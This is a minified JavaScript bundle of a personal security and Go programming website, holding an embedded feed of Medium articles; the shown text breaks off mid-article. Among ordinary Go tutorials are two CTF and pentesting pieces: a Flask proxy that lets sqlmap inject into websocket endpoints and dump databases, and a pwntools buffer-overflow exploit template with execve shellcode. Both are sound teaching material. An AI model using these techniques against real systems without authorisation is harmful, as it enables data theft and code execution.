26.19l-2.44.88-43.88 15.85a13.497 13.497 0 0 0-8.33 16.79l.11.35 12.3 39.36c.06.18.12.36.19.54a7.054 7.054 0 0 0 .4.99 13.482 13.482 0 0 0 15.81 7.53l23.68-6.25 4.83-1.28 61.15-16.15a57.76 57.76 0 0 0 38.22-78.86Z",fill:"#cacaca"})),_||(_=ie.createElement("path",{d:"M44.898 528.7a514.116 514.116 0 0 0 45.75 48.92h451.97a16.446 16.446 0 0 1 16.42 16.43l.65 114.53a355.43 355.43 0 0 0 77.47-48.53q9.84-8.085 19.07-16.87 6.045-5.73 11.8-11.74a355.629 355.629 0 0 0 68.82-102.74Z",fill:"#3f3d56"})),N||(N=ie.createElement("path",{d:"M668.028 631.44q-5.745 6.015-11.8 11.74h-96.21v-11.74Z",fill:"#fff"})),W||(W=ie.createElement("path",{d:"M458.648 255.95a5.538 5.538 0 0 0-4.87-2.9h-327.84a5.555 5.555 0 0 0-5.54 5.55v196.22h338.93V258.6a5.385 5.385 0 0 0-.68-2.65Z",fill:"#3f3d56"})),j||(j=ie.createElement("path",{d:"M120.101 449.507v24.214a7.644 7.644 0 0 0 7.644 7.644h125.097v47.786h-1.662a.993.993 0 0 0-.993.993v3.324a.993.993 0 0 0 .993.993h77.658a.993.993 0 0 0 .993-.993v-3.324a.993.993 0 0 0-.993-.993h-1.662v-47.786h125.097a7.644 7.644 0 0 0 7.644-7.644v-24.214Z",fill:"#3f3d56"})),R||(R=ie.createElement("circle",{cx:285.903,cy:348.704,r:31.306,fill:"#4361ee"})),B||(B=ie.createElement("path",{d:"M365.668 173h-5c0-37.8-37.41-62.57-75.15-62.59a82.382 82.382 0 0 0-16.35 1.59c-6.06 1.21-12.35 2.66-18.53 4.55-24.37 7.47-46.97 21.91-46.97 56.45a78.591 78.591 0 0 0 2.54 19.88l-4.84 1.26a83.876 83.876 0 0 1-2.7-21.14c0-30.18 12.39-50.91 33.79-63.27 11.25-6.5 24.98-10.69 40.71-12.73a97.13 97.13 0 0 1 19.75-.6c43.4 3.12 72.75 36.4 72.75 76.6Z",fill:"#4361ee"})),U||(U=ie.createElement("path",{d:"m373.998 175.77-1.97-14.56a15.71 15.71 0 0 0-5-9.56 15.816 15.816 0 0 0-13.25-4l-3.13.43a6.524 6.524 0 0 0-4.35 2.53 6.548 6.548 0 0 0-1.29 4.87l4.55 33.54a6.577 6.577 0 0 0 5.3 5.57 6.154 6.154 0 0 0 1.22.12 6.499 6.499 0 0 0 .88-.06l3.5-.47a15.791 15.791 0 0 0 10.74-6.43c.27-.38.53-.77.77-1.17a16.748 16.748 0 0 0 2.03-10.81Z",fill:"#4361ee"})),Q||(Q=ie.createElement("path",{d:"M348.628 148.69a6.432 6.432 0 0 0-2.33 1.92 6.548 6.548 0 0 0-1.29 4.87l4.55 33.54a6.577 6.577 0 0 0 5.3 5.57Z",fill:"#fff"})),Y||(Y=ie.createElement("path",{d:"m373.998 175.77-1.97-14.56a15.71 15.71 0 0 0-5-9.56l4.53 33.37a6.176 6.176 0 0 0 .41 1.56 16.748 16.748 0 0 0 2.03-10.81Z",fill:"#3f3d56"})),J||(J=ie.createElement("ellipse",{cx:532.218,cy:258.909,rx:2.5,ry:7,transform:"rotate(-7.725 -144.493 1513.038)",fill:"#3f3d56"})),K||(K=ie.createElement("ellipse",{cx:529.218,cy:240.909,rx:2.5,ry:7,transform:"rotate(-7.725 -147.493 1495.038)",fill:"#3f3d56"})),X||(X=ie.createElement("ellipse",{cx:548.218,cy:247.909,rx:2.5,ry:7,transform:"rotate(-7.725 -128.493 1502.038)",fill:"#3f3d56"})),$||($=ie.createElement("path",{d:"M285.518 110.41a82.382 82.382 0 0 0-16.35 1.59c-6.06 1.21-12.35 2.66-18.53 4.55-9.65-.47-16.75-2.97-18.18-6.82 11.25-6.5 24.98-10.69 40.71-12.73a97.13 97.13 0 0 1 19.75-.6 5.727 5.727 0 0 1 2.72 3.82c.47 3.48-3.5 7.18-10.12 10.19Z",fill:"#3f3d56"})),ee||(ee=ie.createElement("path",{d:"m221.678 207.7-7.7-32.01a6.024 6.024 0 0 0-4.88-4.55 6.733 6.733 0 0 0-1-.08 6.026 6.026 0 0 0-1.4.17l-2.98.72a14.904 14.904 0 0 0-10.99 17.96l3.45 14.36a15.845 15.845 0 0 0 5.34 8.62 14.045 14.045 0 0 0 1.36.97 14.81 14.81 0 0 0 11.37 1.84l2.97-.72a5.84 5.84 0 0 0 2.17-1.01 5.993 5.993 0 0 0 2.29-6.27Z",fill:"#4361ee"})),te||(te=ie.createElement("ellipse",{cx:378.629,cy:274.523,rx:2.5,ry:7,transform:"rotate(-13.531 -44.177 971.198)",fill:"#3f3d56"})),ae||(ae=ie.createElement("ellipse",{cx:368.629,cy:277.523,rx:2.5,ry:7,transform:"rotate(-13.531 -54.177 974.198)",fill:"#3f3d56"})),he||(he=ie.createElement("path",{d:"m222.168 207.58-7.7-32.01a6.532 6.532 0 0 0-5.29-4.92l10.51 43.72a6.511 6.511 0 0 0 2.48-6.79Z",fill:"#fff"})),re||(re=ie.createElement("path",{d:"M194.468 183.57a6.476 6.476 0 0 0-1.17-2.45 14.725 14.725 0 0 0-.57 8.79l3.45 14.36a15.845 15.845 0 0 0 5.34 8.62Z",fill:"#3f3d56"})))}},2422:(e,t,a)=>{a.r(t),a.d(t,{default:()=>M});var h=a(7294),r=(a(9960),a(2263)),i=a(7271);var o=a(7462),l=a(6010);const n={features:"features_t9lD",featureSvg:"featureSvg_GfXr"},s=[{title:"Security",Svg:a(4015).Z,description:h.createElement(h.Fragment,null,"A collection of tips and tricks about security vulnerabilities and attacks continually updated.")},{title:"Examples",Svg:a(6421).Z,description:h.createElement(h.Fragment,null,"The examples section is a collection of real-world examples of security vulnerabilities and exploits.")},{title:"Writeups",Svg:a(181).Z,description:h.createElement(h.Fragment,null,"The writeups section is a collection of writeups of security challenges.")}];function c(e){let{Svg:t,title:a,description:r}=e;return h.createElement("div",{className:(0,l.Z)("col col--4")},h.createElement("div",{className:"text--center"},h.createElement(t,{className:n.featureSvg,role:"img"})),h.createElement("div",{className:"text--center padding-horiz--md"},h.createElement("h3",null,a),h.createElement("p",null,r)))}function d(){return h.createElement("section",{className:n.features},h.createElement("div",{className:"container"},h.createElement("div",{className:"row"},s.map(((e,t)=>h.createElement(c,(0,o.Z)({key:t},e)))))))}var f=a(412);const u={headerText:"headerText_aSd4",headerImage:"headerImage_P3EC",hideMobile:"hideMobile_ijzl",hideDesktop:"hideDesktop_RoKU"};function v(){const e=a(1619).Z;return h.createElement("header",{className:"hero hero--primary"},h.createElement("div",{className:"container"},h.createElement("div",{className:"row"},h.createElement("div",{className:"col col--5 padding--xl text--center"},h.createElement("h1",{className:"hero__title"},"Hey there!",h.createElement("br",null),"I'm Francesco \ud83d\udc4b")),h.createElement("div",{className:"col col--5 col--offset-1"},h.createElement(e,{className:u.headerImage})))))}const m=()=>window.innerWidth<=1200;function p(){if(!f.Z.canUseDOM)return v();const[e,t]=(0,h.useState)(m());return(0,h.useEffect)((()=>{const e=()=>{t(m())};return window.addEventListener("resize",e),()=>{window.removeEventListener("resize",e)}}),[]),e?h.createElement("header",{className:"hero hero--primary"},h.createElement("div",{className:"container"},h.createElement("div",{className:"row"},h.createElement("div",{className:"col col--12 padding--sm text--center"},h.createElement("h1",{className:"hero__title"},"Hey there!",h.createElement("br",null),"I'm Francesco \ud83d\udc4b"))))):v()}const g={title:"title_cqE_"},y=JSON.parse('{"C":{"ev":[{"title":"SQLMap over websockets","link":"https://2h3ph3rd.medium.com/sqlmap-over-websockets-353cdcd9a7ab?source=rss-5a9085122896------2","pubDate":"Wed, 08 Mar 2023 19:17:29 GMT","creator":"Francesco Pastore","categories":["penetration-testing","sqlmap","hacking","htb","sqli"],"guid":"https://medium.com/p/353cdcd9a7ab","description":"SQLMap is a powerful open-source tool that is widely used for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying SQLi vulnerabilities, determining the type of database, and extracting sensitive information from the database.However, there are some limitations to SQLMap. For instance, it may not support certain types of requests, such as those made over websockets. Additionally, working with complex targets can be challenging using SQLMap\xa0alone.In this article, we will explore a possible solution to these issues that requires minimal effort and makes also simpler to work with\xa0SQLMap.The ideaTo simplify the process the idea is to set up a fake server as an intermediary. With this approach, SQLMap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual\xa0target.In this way, SQLMap can be used to test the fake server, which serves as a proxy for the real target. This method can be particularly useful when dealing with complex targets or requests that are not supported by\xa0SQLMap.A simple representation of the\xa0processPrepare the environmentTo set up the server, we will be using Python along with the Flask and Websocket libraries. To get started, we will create a virtual environment and install the necessary packages using\xa0pip.python3 -m venv .venvsource .venv/bin/activatepython3 -m pip install flask websocketOnce the installation is complete, the server can be launched using a simple command. It will be available on localhost by default over the port\xa05000.flask runThe main\xa0serverTo set up the server, all we need to do is define an endpoint that should take one or more query parameters as input and use them to create the\xa0request.from flask import Flask, requestfrom websocket import create_connectionapp = Flask(__name__)ws_url = &quot;ws://website.com&quot; # put here the ws base url# it expects a request like /?query=something@app.route(&quot;/&quot;)def handle():    # query is the query param name used by this endpoint    args = request.args    id = args.get(&#39;query&#39;)    ws = create_connection(ws_url)    # in this example, the websocket endpoint    # expects a json with an id parameter    # that is vulnerable to sqli    payload = &#39;{&quot;id&quot;:&quot;%s&quot;}&#39; % id     ws.send(payload)    res = ws.recv()    ws.close()    if res:        return res    else:In this code, the victim is expected to receive a websocket message containing a JSON object with an ID. The server intercepts the SQLMap request, extracts the ID passed as query, and sent it on to the actual target. This allows SQLMap to be used to test the fake server, which serves as a proxy for the real\xa0target.It is important to note that the server must be running before SQLMap can be executed. Also, be careful to call this file as \u201capp.py\u201d to make it recognizable by flask. Otherwise, you should change the value of the FLASK_APP environment variable.Run SQLMapTo run SQLMap, you simply need to provide the correct URL that includes the query parameter(s) and SQLMap will take care of the\xa0rest.Once SQLMap is executed, it will be able to scan the victim by going through the fake server that we\xa0created.sqlmap -u &quot;http://localhost:5000/?query=1&quot; --batch --dbsSummaryFor your convenience, I leave here a Gist that summarizes the key points of this\xa0article.https://medium.com/media/baca13a17d430e9b0e80a8dead1fff91/hrefhttps://medium.com/media/98c345148d16c58f2bcd27c683c6896e/href"},{"title":"Table driven testing in Go","link":"https://2h3ph3rd.medium.com/table-driven-testing-in-go-c6816ac32448?source=rss-5a9085122896------2","pubDate":"Tue, 28 Feb 2023 20:39:59 GMT","creator":"Francesco Pastore","categories":["go","table-driven-testing","programming","test","golang"],"guid":"https://medium.com/p/c6816ac32448","description":"Testing your code is a crucial step in the development process. However, it can become cumbersome and time-consuming, especially when dealing with a large number of test cases. Manually copying and pasting code to test each case is not an clean solution.In this article we will look to table driven tests in Go to write your test in a fast and efficient way. This approach offers several benefits, including faster test writing, easier maintenance, and improved test coverage.Why a\xa0table?Table-driven testing is an approach that allows us to define and execute multiple test cases in a straightforward way. The idea is to create a \u201ctable\u201d made up of an array of structs, where we can store the input, expected output, and any other relevant information for each test\xa0case.tests := []struct {  // parameter  param1 int  param2 string  param3 interface{} // useful for complex values  // ...  // results  expected1 string  expected2 int  // ...  err error }{}Once we have defined our test cases, we can iterate over the array and execute the function under test for each input, verifying that the actual output matches the expected output for each\xa0case.for _, test := range tests {  actual := function(test.param)  assert.Equal(t, test.expected, actual)}By using this approach, we can write more concise and maintainable test code that covers a wide range of scenarios. We can also easily extend our test suite by adding new test cases to the table, without having to duplicate test code or write new test functions.While it may require some initial effort, this method can ultimately simplify and streamline your code, making it cleaner and more readable.A simple\xa0exampleConsider a function that takes in input an email and checks if it is valid or not by returning a\xa0boolean.package mainimport ( &quot;regexp&quot;)// CheckEmail returns true if the given string is a valid email, otherwise falsefunc CheckEmail(email string) bool { pattern := `^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$` reg := regexp.MustCompile(pattern) return reg.MatchString(email)}In this case of testing a function that takes an email address as input and returns a boolean, we can define a struct with two fields: one for the email input and one for the expected boolean\xa0output.In testing, it\u2019s common to compare an \u201cactual\u201d value (the value returned by the function under test) with an \u201cexpected\u201d value (the value we expect the function to return given a specific\xa0input).package mainimport ( &quot;fmt&quot; &quot;testing&quot; &quot;github.com/stretchr/testify/assert&quot;)func TestCheckEmail(t *testing.T) { tests := []struct {  email    string  expected bool }{  {&quot;email@email.com&quot;, true},  {&quot;123@email.com&quot;, true},  {&quot;email_email_email@email.com&quot;, true},  {&quot;email.email.email@email.com&quot;, true},  {&quot;email!@email.com&quot;, false},  {&quot;email@email&quot;, false},  {&quot;email&quot;, false},  {&quot;@email.com&quot;, false},  {&quot;@email&quot;, false}, } for i, test := range tests {  actual := CheckEmail(test.email)  msg := fmt.Sprintf(&quot;test %d with email %s&quot;, i, test.email)  assert.Equal(t, test.expected, actual, msg) }}Indeed, as you can see in this example, we can test multiple cases in just a few lines of code by using the table-driven approach. This technique can save us time and effort while ensuring that our tests cover a wide range of scenarios.Moreover, adding a new test case is straightforward since all we have to do is add a new entry to the array, with the input and the expected\xa0output.This way, we can easily extend our test suite and cover more edge cases, without having to write additional test functions or duplicating code. By using the table-driven approach, we can keep our test code clean, concise, and maintainable, which can save us time and effort in the long\xa0run.Add a custom\xa0messageIt is possible to add an additional field to the struct for a custom message to be shown in case of an error. This can be particularly useful when debugging failures or identifying issues within your\xa0tests.For example, suppose we want to add a custom error message to the test case we previously discussed. In that case, we could modify the struct to include a field with a descriptive error message that will be displayed if the test\xa0fails.func TestCheckEmailWithMessage(t *testing.T) { tests := []struct {  email    string  expected bool  message  string }{  {&quot;email@email.com&quot;, true, &quot;standard email&quot;},  {&quot;123@email.com&quot;, true, &quot;numbers should be accepted&quot;},  {&quot;email_email_email@email.com&quot;, true, &quot;underscores should be accepted&quot;},  {&quot;email.email.email@email.com&quot;, true, &quot;dots should be accepted&quot;},  {&quot;email!@email.com&quot;, false, &quot;special character not allowed&quot;},  {&quot;email@email&quot;, false, &quot;bad domain given&quot;},  {&quot;email&quot;, false, &quot;no domain given&quot;},  {&quot;@email.com&quot;, false, &quot;no username given&quot;},  {&quot;@email&quot;, false, &quot;no username and bad domain given&quot;}, } for _, test := range tests {  actual := CheckEmail(test.email)  assert.Equal(t, test.expected, actual, test.message) }}Handle a lot of parametersWhen dealing with a large number of parameters, it can become challenging to manage them effectively. In such situations, creating multiple structs, each designed to handle a specific aspect of the problem, can be a better approach. These structs can be organized as separate arrays with the same number of elements, simplifying their management.This technique can prove especially helpful when mocking an interface, where numerous methods are called by the function under test. By dividing the parameters into multiple structs, you can improve the organization and readability of your code, making it easier to maintain and\xa0debug.func TestMultipleStructs(t *testing.T) { func1 := []struct {  param  string  result int  err    error }{} func2 := []struct {  param1 time.Time  param2 string  result string  err    error }{} tests := []struct {  param    int  expected string  err      error }{} // check same number of test cases assert.Len(t, func1, len(func2)) for i := range func1 {  // do something with func1[i]  f1 := func1[i]  mock.Interface.EXPECT().Func1(f1.param).Return(f1.result, f1.err)  // do something with func2[i]  f2 := func2[i]  mock.Interface.EXPECT().Func2(f2.param1, f2.param2).Return(f2.result, f2.err)  // check result  test := tests[i]  actual, err := FunctionToTest(test.param)  assert.Equal(t, test.expected, actual)  if test.err == nil {   assert.Nil(t, err)  } else {   assert.EqualError(t, err, test.err.Error())  } }}The next time you write a test, consider how you can structure it with the table driven approach. Overall, taking the time to structure your tests in this way can lead to more robust and reliable code, making it a worthwhile investment in the quality of your software."},{"title":"Five web frameworks for Go","link":"https://2h3ph3rd.medium.com/five-web-frameworks-for-go-3b9036b319ff?source=rss-5a9085122896------2","pubDate":"Thu, 09 Feb 2023 21:00:45 GMT","creator":"Francesco Pastore","categories":["api","web-development","go","golang","web-framework"],"guid":"https://medium.com/p/3b9036b319ff","description":"Go is becoming one of the most widely used languages for creating APIs because of its simplicity and speed. In fact, compared to other languages such as Python or Javascript, a Go program is strongly and statically typed, and compiled directly, allowing for higher performance.There are many web frameworks available for Go, in this article we will look at five of the most popular\xa0ones.GinGin is a highly popular web framework (66K stars on Github!) for the Go programming language, known for its simplicity and speed. Its popularity makes it a common choice for new projects with a long-term vision.Gin provides a variety of interfaces and structures to simplify development, such as the specific gin context and a streamlined middleware structure. However, it may take some time for developers familiar with the standard net/http package to fully understand and utilize all of Gin\u2019s features.ProFast and lightweightActive communityConsDifferent than\xa0net/httpHigh learning\xa0curvepackage mainimport &quot;github.com/gin-gonic/gin&quot;func main() { r := gin.Default() r.GET(&quot;/ping&quot;, func(c *gin.Context) {  c.JSON(200, gin.H{   &quot;message&quot;: &quot;pong&quot;,  }) }) r.Run() // listen and serve on 0.0.0.0:8080}Gin Web FrameworkGitHub - gin-gonic/gin: Gin is a HTTP web framework written in Go (Golang). It features a Martini-like API with much better performance -- up to 40 times faster. If you need smashing performance, get yourself some Gin.FiberFiber is a web framework for Go that is built on the fasthttp package, making it faster than other frameworks. However, this also comes with some drawbacks.Because fasthttp is relatively new and not fully developed like the net/http package, currently it has several shortcomings, such as support for HTTP/2. If you are considering using this framework, it is important to consider whether the features provided are sufficient for your project\xa0needs.ProFastWell documentedA lot of middlewares availableConsNo HTTP/2\xa0supportfasthttp is not fully completed as\xa0net/httppackage mainimport &quot;github.com/gofiber/fiber/v2&quot;func main() {    app := fiber.New()    app.Get(&quot;/&quot;, func(c *fiber.Ctx) error {        return c.SendString(&quot;Hello, World \ud83d\udc4b!&quot;)    })    app.Listen(&quot;:3000&quot;)}FiberGitHub - gofiber/fiber: \u26a1\ufe0f Express inspired web framework written in GoGo ChiGo Chi is a less well-known web framework for Go, but its simplicity, lightweight structure, and speed make it a solid choice for web development. Also, its similarities to the now-archived Gorilla/mux project have made it a popular substitute.The framework has well-written documentation and a variety of out-of-the-box middlewares such as JWT authentication, logging, and rate limiting. All of these features make Chi a good option for your next web\xa0project.ProNo external dependenciesFully compatible with standard net/http package\xa0but\u2026Cons\u2026 sometimes could be too\xa0verboseMaintenance is not high at the\xa0moment.package mainimport (    &quot;net/http&quot;    &quot;github.com/go-chi/chi/v5&quot;    &quot;github.com/go-chi/chi/v5/middleware&quot;)func main() {    r := chi.NewRouter()    r.Use(middleware.Logger)    r.Get(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {        w.Write([]byte(&quot;Hello World!&quot;))    })    http.ListenAndServe(&quot;:3000&quot;, r)}go-chi docsGitHub - go-chi/chi: lightweight, idiomatic and composable router for building Go HTTP servicesEchoEcho is a web framework for Go that is designed for high performance and ease of use. It is built on top of the net/http package and a structure very similar to\xa0Gin.Echo also provides a wide range of built-in middleware for tasks such as logging, recovery, and CORS, as well as support for custom middleware. It is also extensible and has support for template rendering, WebSockets, and\xa0HTTP/2.ProA big collection of middlewaresConsNot so popular as\xa0Ginpackage mainimport ( &quot;net/http&quot;  &quot;github.com/labstack/echo/v4&quot;)func main() { e := echo.New() e.GET(&quot;/&quot;, func(c echo.Context) error {  return c.String(http.StatusOK, &quot;Hello, World!&quot;) }) e.Logger.Fatal(e.Start(&quot;:1323&quot;))}RevelRevel is a web framework that is built around the Model-View-Controller architecture. This makes it a great choice for projects that adhere to this design pattern, but it may not be the best fit for\xa0others.Additionally, Revel offers hot reloading and an excellent documentation. However, it lacks some important elements for a MVC framework like an ORM or an advanced template\xa0engine.ProHot reloadingGood documentationMVC support\xa0but\u2026Cons\u2026 if you don\u2019t use MVC it could be troublesomeORM must be installed manually if\xa0neededFew middlewares available (what about a rate limiter or a jwt auth middleware?)RevelGitHub - revel/revel: A high productivity, full-stack web framework for the Go language.I hope this article has been useful for your next Go project. There are many web frameworks out there; here we have reviewed just five of the most popular\xa0ones."},{"title":"The all-in-one microservice to manage PDF","link":"https://2h3ph3rd.medium.com/the-all-in-one-microservice-to-manage-pdf-in-your-app-7fe2e8178391?source=rss-5a9085122896------2","pubDate":"Sun, 27 Nov 2022 09:41:17 GMT","creator":"Francesco Pastore","categories":["microservices","go","api","backend","pdf"],"guid":"https://medium.com/p/7fe2e8178391","description":"PDF is one of the most common ways used to share data. It is mainly chosen for portability because a PDF file structure does not change between different systems.Working with PDF in your app could not be a piece of cake. Some languages do not have good libraries and conversions between different file types are not so easy. Don\u2019t worry, Gotenberg can\xa0help!Wait, what is Gotenberg?Gotenberg is a microservice written in Go and made to be run as a docker container in your server. It allows managing PDF easily by using its very straightforward API.In this article, we will some examples of interactions with Gotenberg, but first, how can we start using\xa0it?Gotenberg | GotenbergInstallationGotenberg can be run easily by using the official Docker image from Docker\xa0Hub.docker run --rm -p 3000:3000 gotenberg/gotenberg:7One line and everything is\xa0readyThere is also a live demo available with some limitations. Look to the official documentation for more details about\xa0it.\ud83d\udd25 Live Demo | GotenbergPDF merge? No\xa0problem!If you need to merge multiple PDF files you can call the endpoint by doing a POST request with the files passed inside the body. Remember to use form files available in every HTTP request\xa0library.curl --request POST &#39;http://localhost:3000/forms/pdfengines/merge&#39; \\\\  --form &#39;files=@&quot;./sample1.pdf&quot;&#39; \\\\  --form &#39;files=@&quot;./sample2.pdf&quot;&#39; \\\\  -o merged.pdfOfficial docsThere are a lot of features available like Office files to PDF or markdown to PDF. Look to the documentation for all the details about them and the ones shown\xa0here.About | GotenbergCustom HTML file to\xa0PDFcurl \\\\--request POST &#39;http://localhost:3000/forms/chromium/convert/html&#39; \\\\--form &#39;files=@&quot;./index.html&quot;&#39; \\\\-o my.pdfPublic website URL to\xa0PDFcurl \\\\--request POST &#39;http://localhost:3000/forms/chromium/convert/url&#39; \\\\--form &#39;url=&quot;https://www.google.com&quot;&#39; \\\\-o my.pdfOne note about authenticationPay attention to authentication, it is better to make Gotenberg available only to the internal network. Otherwise, you could add special endpoints to your back end that allows accessing the pod from the Internet.In every case remember that Gotenberg has no authentication service, so be careful of whom can access\xa0it.Gotenberg can be a big help in your applications if you need to manage PDFs. Give it a try and let me know if you find it\xa0useful!"},{"title":"Ten resources for binary challenges","link":"https://2h3ph3rd.medium.com/ten-resources-for-binary-challenges-d9c22b8d87a6?source=rss-5a9085122896------2","pubDate":"Sun, 27 Nov 2022 08:58:53 GMT","creator":"Francesco Pastore","categories":["buffer-overflow","pwn","ctf","exploitation","binary"],"guid":"https://medium.com/p/d9c22b8d87a6","description":"Binary challenges are one of the most common types of CTF. Usually, they require you to analyze a binary and exploit some vulnerabilities.There are a lot of tools out there, and in this article, we will see ten of them that you can\u2019t miss during your exploitation. Without these resources, resolving binary challenges would not be the\xa0same.1. pwntoolspwntools is a python package that allows you to write exploits faster. It gives a lot of utilities that can help you to write code during binary challenges.Here you can see a simple exploit for shellcode exploitation with a buffer overflow vulnerability.#!/usr/bin/env python3import sysfrom pwn import *if &quot;--remote&quot; in sys.argv:    p = remote(&quot;url&quot;, 1337)else:    p = process(&quot;./path_to_binary&quot;)if &quot;--debug&quot; in sys.argv:    context.terminal = [&quot;gnome-terminal&quot;]    gdb.attach(p, &quot;&quot;&quot;    b *0x&lt;breakpoint_address&gt;    c    &quot;&quot;&quot;)shellcode = asm(&quot;&quot;&quot;mov rax, 0x3bmov rdi, &lt;buffer_address&gt;mov rsi, 0mov rdx, 0syscall&quot;&quot;&quot;, arch=&#39;amd64&#39;)payload = &quot;A&quot; * 64payload += shellcodep.sendline(payload)p.interactive()pwntools - pwntools 4.8.0 documentation2. pwndbgpwndbg helps to make gdb more accessible by adding powerful commands and a better interface. Each address is printed with a different color to indicate which part of the memory it is relative to. Also, the context that is shown at every breakpoint helps to take a quick look at the current state of the execution.An example of context with\xa0pwndbgGitHub - pwndbg/pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy3. GhidraDeveloped by the NSA, Ghidra is one of the most used tools for reverse engineering. Also, it is completely open source and free to\xa0use.An example of a binary disassembled with\xa0GhidraGhidra4. ref.x86asm.netIn some challenges, it could be fundamental to know which is the code for every possible assembly operation available. You can find a list with a lot of details about each instruction on this website. There is also written what is the meaning of each byte and the possible ways to use each operation.INC of a 32 bit register is coded as 40 + the number of the\xa0registerX86 Opcode and Instruction Reference5. defuse.caIt could be a mess to compile assembly code, but don\u2019t worry, this website can help you! You can write a list of assembly instructions and see the compilation result for x86 and x64. Also, there are multiple representations available like string literal or raw hex to easily copy and paste the result into your\xa0code.Example of assembly\xa0compilerOnline x86 and x64 Intel Instruction Assembler6. syscall.shThere are a lot of available lists on the internet, but this one can beat them all. The URL can be memorized easily and with one click you can look at x86, x64, arm, and arm64 syscalls details. Furthermore, there is also a public API that you could call in your\xa0scripts!The execve definition in\xa0x64Linux System Calls quick and easy7. how2heapHeap exploitation is one of the most complex types of challenges in the binary field. The goal is usually to exploit the logic behind heap management. This means that is fundamental to know how malloc, calloc, and free works and also the cleaning systems like the t-cache and the different types of\xa0bins.how2heap has a lot of examples of how to exploit different heap vulnerabilities. Each example has a C code that explains the attack. This allows you to build the code and run it with a debugger to look carefully at all the operations done. Thanks to this tool heap exploitation become more accessible for everyone.A simple example for a fast bin\xa0attackGitHub - shellphish/how2heap: A repository for learning various heap exploitation techniques.8. ngrokSometimes, you could need to obtain a reverse shell by using sockets or send data to a self-hosted API. The big problem in this situation is that you need to know your IP and your firewall must allow external connections.In these cases, ngrok can help. It makes public a port of your host that you decide and it gives an URL. You only need to connect to the given URL and everything works. One line and your service hosted on your computer will be available on the internet.An http server accessible locally at port 3000 with a public\xa0linkngrok - Online in One Line9. preenypreeny is a set of libraries that can be used to avoid the execution of anti-debugging functions like alarm or fork. You only need to run your binary by prepending the string LD_PRELOAD=./path/to/preeny and you are\xa0done.Example of usage to remove socket connections from a\xa0binaryGitHub - zardus/preeny: Some helpful preload libraries for pwning stuff.10. pwninitUsually, every challenge requires some common operation to be done at the beginning. For example, you could download the same libc version of the binary and then patch it. pwninit can help by automatizing the first operations that usually are done. Next time try giving pwninit a chance to start exploitation.pwinit searches by default for a binary called hunter and makes a patched version of it. It creates also a basic initial script that can be used to begin exploitation.Example of pwninit with a binary called\xa0hunterGitHub - io12/pwninit: pwninit - automate starting binary exploit challengesI think that these ten tools are very helpful for every binary challenge. Give them a try and let me know in the comments if you find them\xa0useful.Good pwning!\xa0\ud83d\udc68\u200d\ud83d\udcbb"},{"title":"Why you should leave Gorilla and start using Fiber instead","link":"https://2h3ph3rd.medium.com/why-you-should-leave-gorilla-and-start-using-fiber-instead-35093c6f6e77?source=rss-5a9085122896------2","pubDate":"Sat, 12 Nov 2022 18:11:31 GMT","creator":"Francesco Pastore","categories":["go","fiber","backend","rest","golang"],"guid":"https://medium.com/p/35093c6f6e77","description":"Gorilla is one of the most used Go libraries to develop REST API. It is very simple to use and it makes the standard net/http library more accessible.In a big project, it could help to use a more clean and optimized framework that hides unuseful complexity. This is where Fiber can\xa0help!FiberFast, fast, and again\xa0fast!On the homepage of the Fiber documentation, you can see a comparison between the most common Go frameworks like Gin, Martini, and Negroni. Fiber is one of the best, thanks to the fasthttp package under the hood that is much faster than the standard net/http\xa0package.fasthttp package has the best performanceThe documentation is well written, yes it is possible!If you have developed with Go for some time you have already accepted that the language is relatively new. So, also the libraries that have been\xa0made.Usually, the documentations are a work in progress and there is not enough information to use the library properly.Fortunately, this is not the case. The Fiber docs contain everything fundamental you could need and it is really well\xa0written.The homepage of the official Fiber\xa0docsMiddleware in one\xa0lineIf you take a look at the documentation of Fiber you can see that there are a lot of middlewares available.MiddlewareFor example, to add a rate limiter to your app you have to simply add this\xa0line.app.Use(limiter.New())A rate limiter will be added to your app with the default settings. With a single line your worries are at\xa0ease.One context to rule them\xa0allUsually, you have to manage a lot of parameters like an http request and response, a parsed token, or other additional stuff your logic could need. Fiber simplify this by using a single variable called Context where everything is put in it. Your function will have only to take as input a parameter and it will have access to everything it could\xa0need.app.Get(&quot;/&quot;, func (c *fiber.Ctx) error {  c.AllParams()  c.Cookies(&quot;name&quot;)  c.IPs()  c.Query(&quot;order&quot;)  // ...  return c.Send([]byte(&quot;Hello, World!&quot;))})Error handling is a piece of\xa0cake.Your app should return a valid response even if an error occurs. Managing them could be difficult, but even for this problem Fiber has a solution.You can return a specific fiber error with a status code and a message and everything will be taken care of by Fiber itself. Like a piece of\xa0cake!app.Get(&quot;/&quot;, func(c *fiber.Ctx) error {  return fiber.NewError(fiber.StatusServiceUnavailable, &quot;On vacation!&quot;)})I hope that you will give a chance to Fiber for your next project. Let me know if you like\xa0it!"},{"title":"Five tips on how to use Gorm better","link":"https://2h3ph3rd.medium.com/five-tips-on-how-to-use-better-gorm-90f42d37aa20?source=rss-5a9085122896------2","pubDate":"Tue, 01 Nov 2022 09:53:00 GMT","creator":"Francesco Pastore","categories":["gorm","tips","orm","golang","go"],"guid":"https://medium.com/p/90f42d37aa20","description":"Gorm is one of the most used ORM for the Go language. It is complete and very easy to use. But sometimes the documentation does not cover all the\xa0case.There are some functionalities that once known can help you to write better code and simplify your work. Let see five tips on how to use Gorm\xa0better.Use custom foreign key constraintsWhen you create relations between tables remember to update the constraints on the foreign keys. As default, Gorm set the mode \u201cNO ACTION\u201d for update and delete\xa0cases.However, you could make your life easier by using specific modes like for example the \u201cCASCADE\u201d one. Every time a primary key is updated also the relative foreign key will be too. Instead, if a referenced record is deleted also the rows that reference it will be deleted as\xa0well.In PostgreSQL the available constraints are:SET NULL: set the foreign key to\xa0nullCASCADE: do the same action as done on the referenced row.SET DEFAULT: set the foreign key to the default value (null or empty if not specified)NO ACTION and RESTRICT: in few words, they do not allow some operations on the referenced row. Look to the documentation to read more details about\xa0them.5.4. ConstraintsAn example of specific constraints defined on the\xa0model.Has OneNot using debug when\xa0stuckedOne of the most easier way to find errors is to use the inner debug utility available with Gorm. You just need to prepend \u201c. Debug()\u201d to your function call and you are done! Now, all the queries will be executed as before but in addition the statement is\xa0printed.db.Debug().Table(&quot;users&quot;).Select(&quot;users.name, emails.email&quot;).Joins(&quot;left join emails on emails.user_id = 